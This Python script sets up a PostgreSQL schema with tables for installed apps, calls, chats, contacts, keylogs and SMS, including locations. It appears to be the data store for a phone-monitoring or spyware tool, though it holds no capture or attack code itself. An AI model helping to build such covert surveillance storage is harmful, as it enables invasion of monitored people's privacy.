import logging
from models import get_db_connection, test_db_connection

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - [%(filename)s:%(lineno)d] - %(message)s'
)
logger = logging.getLogger(__name__)

def check_table_exists(cursor, table_name):
    """Check if a table exists"""
    cursor.execute("""
        SELECT EXISTS (
            SELECT FROM information_schema.tables 
            WHERE table_schema = 'public' 
            AND table_name = %s
        )
    """, (table_name,))
    return cursor.fetchone()[0]

def init_db():
    """Initialize database schema with better error handling"""
    try:
        with get_db_connection() as conn:
            with conn.cursor() as cur:
                # Check existing tables
                tables = ['applications', 'calls', 'chats', 'contacts', 'keylogs', 'sms']
                existing_tables = []
                
                for table in tables:
                    if check_table_exists(cur, table):
                        existing_tables.append(table)
                
                if existing_tables:
                    logger.info(f"Found existing tables: {', '.join(existing_tables)}")
                    # Only drop if tables are empty
                    for table in existing_tables:
                        cur.execute(f"SELECT COUNT(*) FROM {table}")
                        count = cur.fetchone()[0]
                        if count > 0:
                            logger.info(f"Table {table} has {count} rows, skipping recreation")
                            continue
                        logger.info(f"Dropping empty table {table}")
                        cur.execute(f"DROP TABLE IF EXISTS {table} CASCADE")
                
                # Create applications table if not exists
                if not check_table_exists(cur, 'applications'):
                    cur.execute("""
                        CREATE TABLE applications (
                            application_id SERIAL PRIMARY KEY,
                            application_name VARCHAR(255) NOT NULL,
                            package_name VARCHAR(255) UNIQUE NOT NULL,
                            installed_date TIMESTAMP
                        )
                    """)
                    logger.info("Created applications table")
                
                # Create calls table if not exists
                if not check_table_exists(cur, 'calls'):
                    cur.execute("""
                        CREATE TABLE calls (
                            id SERIAL PRIMARY KEY,
                            call_type VARCHAR(50),
                            call_time TIMESTAMP,
                            from_to VARCHAR(255),
                            duration INTEGER,
                            location TEXT
                        )
                    """)
                    logger.info("Created calls table")
                
                # Create chats table if not exists
                if not check_table_exists(cur, 'chats'):
                    cur.execute("""
                        CREATE TABLE chats (
                            id SERIAL PRIMARY KEY,
                            messenger VARCHAR(100),
                            time TIMESTAMP NOT NULL,
                            sender VARCHAR(255) NOT NULL,
                            recipient VARCHAR(255) NOT NULL,
                            text TEXT
                        )
                    """)
                    logger.info("Created chats table")
                
                # Create contacts table if not exists
                if not check_table_exists(cur, 'contacts'):
                    cur.execute("""
                        CREATE TABLE contacts (
                            id SERIAL PRIMARY KEY,
                            name VARCHAR(255) UNIQUE NOT NULL,
                            last_message_time TIMESTAMP
                        )
                    """)
                    logger.info("Created contacts table")
                
                # Create keylogs table if not exists
                if not check_table_exists(cur, 'keylogs'):
                    cur.execute("""
                        CREATE TABLE keylogs (
                            id SERIAL PRIMARY KEY,
                            application VARCHAR(255) NOT NULL,
                            time TIMESTAMP NOT NULL,
                            text TEXT
                        )
                    """)
                    logger.info("Created keylogs table")
                
                # Create SMS table if not exists
                if not check_table_exists(cur, 'sms'):
                    cur.execute("""
                        CREATE TABLE sms (
                            id SERIAL PRIMARY KEY,
                            from_to VARCHAR(255),
                            text TEXT,
                            time TIMESTAMP NOT NULL,
                            location TEXT
                        )
                    """)
                    logger.info("Created sms table")
                
                # Create or update indexes for better performance
                indexes = [
                    ('idx_apps_installed_date', 'applications(installed_date)'),
                    ('idx_calls_time', 'calls(call_time)'),
                    ('idx_chats_time', 'chats(time)'),
                    ('idx_contacts_name', 'contacts(name)'),
                    ('idx_keylogs_time', 'keylogs(time)'),
                    ('idx_sms_time', 'sms(time)')
                ]
                
                for idx_name, idx_def in indexes:
                    cur.execute(f"""
                        DROP INDEX IF EXISTS {idx_name};
                        CREATE INDEX {idx_name} ON {idx_def};
                    """)
                    logger.info(f"Created/updated index {idx_name}")
                
            logger.info("Database initialization completed successfully")
            return True
            
    except Exception as e:
        logger.error(f"Database initialization failed: {str(e)}")
        raise

if __name__ == '__main__':
    try:
        init_db()
        if test_db_connection():
            logger.info("Database initialized and connection test successful!")
        else:
            logger.error("Database connection test failed")
    except Exception as e:
        logger.error(f"Failed to initialize database: {str(e)}")
